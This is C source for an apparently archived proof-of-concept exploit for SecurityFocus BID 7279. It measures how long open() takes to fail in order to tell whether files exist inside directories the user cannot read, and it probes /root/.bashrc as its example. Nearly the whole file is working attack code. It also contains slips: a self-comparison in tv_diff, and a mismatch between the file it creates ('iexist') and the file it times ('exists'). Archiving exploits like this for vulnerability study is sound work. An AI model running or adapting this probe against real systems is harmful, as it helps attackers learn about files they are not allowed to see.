/*
source: http://www.securityfocus.com/bid/7279/info

A weakness has been discovered on various systems that may result in an attacker gaining information pertaining to the existence of inaccessible files. The problem lies in the return times when attempting to access existent and non-existent files.

By making requests for various files, it may be possible for an attacker to deduce whether the file exists, by examining the amount of time it takes for an error to be returned. 
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>

#ifndef O_NOFOLLOW
#define O_NOFOLLOW  0400000 /* don't follow links */
#endif

#ifndef O_LARGEFILE
#define O_LARGEFILE 0100000
#endif

int flags = O_RDONLY|O_EXCL|O_SYNC|O_NOCTTY|O_NOFOLLOW;

/* taken from scuts format string example/brute_blind example */

unsigned long int
tv_diff (struct timeval *tv_a, struct timeval *tv_b)
{
        unsigned long int       diff;

        if (tv_a->tv_sec < tv_b->tv_sec ||
                (tv_a->tv_sec == tv_b->tv_sec && tv_a->tv_sec < 
tv_b->tv_sec))
        {
                struct timeval *        tvtmp;

                tvtmp = tv_b;
                tv_b = tv_a;
                tv_a = tvtmp;
        }

        diff = (tv_a->tv_sec - tv_b->tv_sec) * 1000000;
        if (tv_a->tv_sec == tv_b->tv_sec) {
                diff += tv_a->tv_usec - tv_b->tv_usec;
        } else {
                if (tv_a->tv_usec >= tv_b->tv_usec)
                        diff += tv_a->tv_usec - tv_b->tv_usec;
                else
                        diff -= tv_b->tv_usec - tv_a->tv_usec;
        }

        return (diff);
}

void cleanup()
{

	printf("[+] cleaning up\n");
	if(chmod("unreachable", 0700)==-1) {
		printf("\t[-] Unable to revert unreachable back to being reachable\n");
		exit(EXIT_FAILURE);
	}

	if(unlink("unreachable/iexist")==-1) {
		printf("\t[-] Unable to remove unreachable/iexist\n");
		exit(EXIT_FAILURE);
	}

	if(rmdir("unreachable")==-1) {
		printf("\t[-] Unable to rmdir unreachable\n");
		exit(EXIT_FAILURE);
	}
}

int main(int argc, char **argv)
{
	struct timeval tv_a, tv_b;
	int fd_a, fd_b;
	char buf_a[500], buf_b[500];

	unsigned int success, n, failure;
	
	atexit(cleanup);
	
	printf("[+] creating unreachable\n");
	if(mkdir("unreachable", 0700)==-1) {
		printf("\t[-] Unable to create unreachable\n");
		exit(EXIT_FAILURE);
	}
	
	printf("[+] creating unreachable/iexist\n");
	if((fd_a = creat("unreachable/iexist", 0700))==-1) {
		printf("\t[-] Unable to create unreachable/iexist\n");
		exit(EXIT_FAILURE);
	}
	close(fd_a);

	printf("[+] chmod 0'ing unreachable\n");
	if(chmod("unreachable", 00)==-1) {
		printf("\t[-] Unable to chmod unreachable\n");
		exit(EXIT_FAILURE);
	}

	printf("[+] "); fflush(stdout);

	system("ls -alF | grep unreachable");
	
	printf("[+] Timing open() on unreachable/iexist\n");
	
	/* fd_a = open("unreachable/exists", flags);
	close(fd_a); */
	
	gettimeofday(&tv_a, NULL);
	fd_a = open("unreachable/exists", flags);
	gettimeofday(&tv_b, NULL);
	
	
	printf("\t[+] Successful: %ld usecs, got %m\n", (success = tv_diff(&tv_b, &tv_a)));
	close(fd_a);

	printf("[+] Timing open() on unreachable/non-existant\n");
	
/*	fd_b = open("unreachable/non-existant", flags);
	close(fd_b); */
	
	gettimeofday(&tv_a, NULL);
	fd_b = open("unreachable/non-existant", flags);
	gettimeofday(&tv_b, NULL);
	

	printf("\t[+] Failure: %ld usecs, got %m\n", (failure = tv_diff(&tv_b, &tv_a)));

	close(fd_b);
	success += tv_diff(&tv_b, &tv_a);
	
	success /= 3;
//	success -= 2;

	if(failure > success || success > (failure*8) ) {
		printf("[-] It appears the load went up unexpectadly, mebe try re-running?\n");
		exit(EXIT_FAILURE);
	}

	/* tweak the success value */

	if((failure*4) >= success) success--;
	if(success <= (failure*3)) success++;
	
	printf("\t[+] Using %d as our cutoff.\n", success);
	printf("[+] testing /root/.bashrc and /root/non-existant\n");
	
/*	fd_a = open("/root/.bashrc", flags);
	close(fd_a); */
	
	gettimeofday(&tv_a, NULL);
	fd_a = open("/root/.bashrc", flags);
	gettimeofday(&tv_b, NULL);
	
	if((n = tv_diff(&tv_b, &tv_a)) >= success) {
		printf("\t[+] /root/.bashrc exists (%d usecs), got %m\n", n);
	} else {
		printf("\t[+] /root/.bashrc doesn't exist (%d usecs), got %m\n", n);
	}
	close(fd_a);
	
/*	fd_b = open("/root/non-existant", flags);
	close(fd_b); */
	
	gettimeofday(&tv_a, NULL);
	fd_b = open("/root/non-existant", flags);
	gettimeofday(&tv_b, NULL);
	
	if((n = tv_diff(&tv_b, &tv_a)) >= success) {
		printf("\t[+] /root/non-existant exists (%d usecs), got %m\n", n);
	} else {
		printf("\t[+] /root/non-existant doesn't exist (%d usecs), got %m\n", n);
	}
	
	close(fd_b);
}
	